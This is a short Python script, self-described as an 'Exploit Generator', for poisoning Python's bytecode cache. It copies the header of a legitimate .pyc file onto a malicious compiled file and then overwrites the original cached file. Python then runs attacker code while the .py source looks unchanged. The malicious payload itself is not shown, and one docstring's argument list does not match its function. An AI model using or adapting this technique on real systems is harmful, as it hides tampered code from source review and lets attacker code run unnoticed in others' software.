import importlib
import shutil
import os

def generate_header(input_file_path:str) -> bytes:
    """
    Header is a series of four DWORD values that span from the magic bytes
     to a bitfield for specifying the type check and also a size field. This
     function exists to generate a header for a given python .py file.
    
    Arguments:
    - input_file_path:str, the input file specified via a path as a string

    Returns
    - bytes, the 4 DWORD bytestring header from the source file

    Raises
    - IOError, raised on inaccssible, nonexistant or otherwise invalid input
    """
    MAGIC     = importlib.util.MAGIC_NUMBER
    BIT_FIELD = (0).to_bytes(4, 'little')
    TIMESTAMP = (int(os.stat(input_file_path).st_mtime) & 0xFFFFFFFF).to_bytes(4, 'little')
    FILE_SIZE = os.stat(input_file_path).st_size.to_bytes(4, 'little')

    return MAGIC + BIT_FIELD + TIMESTAMP + FILE_SIZE


def set_file_header(output_file_path:str, target_pyc_path:str) -> None:
    """
    Opens a file and uses binary write mode to read the content, replaces
     the header in the output file path with the target_pyc_path header.

    Arguments:
    - input_file_path:str, the input file specified via a path as a string
    - header:bytes, the header to write over the existing values as bytes

    Raises:
    - IOError, raised on inaccssible, nonexistant or otherwise invalid input
    """
    header = None
    with open(target_pyc_path, 'rb') as fio:
        header = fio.read()[:16]
    
    content = None
    with open(output_file_path, 'rb') as fio:
        content = fio.read()[16:]

    with open(output_file_path, 'wb') as fio:
        fio.write(header + content)

"""
Exploit Generator, this will set the header for the malcious PYC
and then copy it to the target, overwriting the original.
"""
target_pyc = 'some_library/__pycache__/hello.cpython-310.pyc'
malicious_pyc = 'bad_library/__pycache__/hello.cpython-310.pyc'

# Copy to output and replace header in malicious with original
set_file_header(malicious_pyc, target_pyc)
shutil.copyfile(malicious_pyc, target_pyc)

"""
Now that the cache is consistent with the origin source, replace the 
 cache with our poisoned copy and while the source stays the same
 our exploit code will run without any change.
 """